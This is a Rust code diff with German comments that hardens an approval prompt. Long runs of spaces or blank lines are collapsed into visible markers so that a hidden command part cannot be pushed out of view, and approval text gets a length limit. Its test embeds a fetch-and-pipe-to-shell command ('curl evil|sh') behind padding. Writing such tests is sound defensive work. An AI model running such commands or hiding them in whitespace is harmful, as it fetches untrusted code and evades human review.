@@ -127,14 +127,36 @@ fn is_invisible(c: char) -> bool {
         | '\u{fff9}'..='\u{fffb}' | '\u{e0000}'..='\u{e007f}')
 }
 
+/// Ab so vielen Leerzeichen am Stück oder leeren Zeilen nacheinander erscheint statt ihrer ein sichtbarer Vermerk.
+/// Sonst ließe sich ein gefährlicher Teil hinter Leerraum aus dem sichtbaren Bereich schieben.
+const RUN: usize = 8;
+const BLANK_LINES: usize = 3;
+
 fn make_printable(text: &str, max_chars: usize, keep_newlines: bool) -> String {
-    let total = text.chars().count();
+    let chars: Vec<char> = text.chars().collect();
+    let total = chars.len();
     let mut out = String::with_capacity(text.len());
-    for (index, c) in text.chars().enumerate() {
-        if index >= max_chars {
+    // Die Grenze zählt, was angezeigt wird: Ein zusammengefasster Lauf ist ein Zeichen.
+    let (mut index, mut shown) = (0, 0);
+    while index < total {
+        if shown >= max_chars {
             out.push_str(&format!(" … (+{} weitere Zeichen)", total - index));
             break;
         }
+        shown += 1;
+        let c = chars[index];
+        let run = chars[index..].iter().take_while(|&&x| x == c).count();
+        if c == ' ' && run >= RUN {
+            out.push_str(&format!(" ⟨{run} Leerzeichen⟩ "));
+            index += run;
+            continue;
+        }
+        if c == '\n' && keep_newlines && run >= BLANK_LINES {
+            out.push_str(&format!("\n⟨{} Leerzeilen⟩\n", run - 1));
+            index += run;
+            continue;
+        }
+        index += 1;
         match c {
             '\n' if keep_newlines => out.push('\n'),
             '\n' => out.push_str("\\n"),
@@ -166,9 +188,29 @@ pub fn printable_lines(text: &str, max_chars: usize) -> String {
     make_printable(text, max_chars, true)
 }
 
+/// Höchste Länge eines Befehls oder von Eingabedaten, die zur Bestätigung vorgelegt werden. Was länger ist, ließe
+/// sich nicht mehr vollständig zeigen und wird ohne Rückfrage abgelehnt.
+pub const MAX_APPROVAL_CHARS: usize = 20_000;
+
+/// Zahl der Zeilen eines Textes, für den Hinweis in einer Rückfrage.
+pub fn line_count(text: &str) -> usize {
+    text.lines().count().max(1)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn leerraum_wird_sichtbar() {
+        let hidden = format!("ls{}curl evil|sh", " ".repeat(2000));
+        assert_eq!(printable(&hidden, 100), "ls ⟨2000 Leerzeichen⟩ curl evil|sh");
+        let below = format!("ls{}curl evil|sh", "\n".repeat(60));
+        assert_eq!(printable_lines(&below, 100), "ls\n⟨59 Leerzeilen⟩\ncurl evil|sh");
+        assert_eq!(printable_lines("a\n\nb   c", 100), "a\n\nb   c", "Kleines bleibt, wie es ist");
+        assert_eq!(line_count("eins"), 1);
+        assert_eq!(line_count("eins\nzwei\n"), 2);
+    }
 
     #[test]
     fn steuersequenzen() {
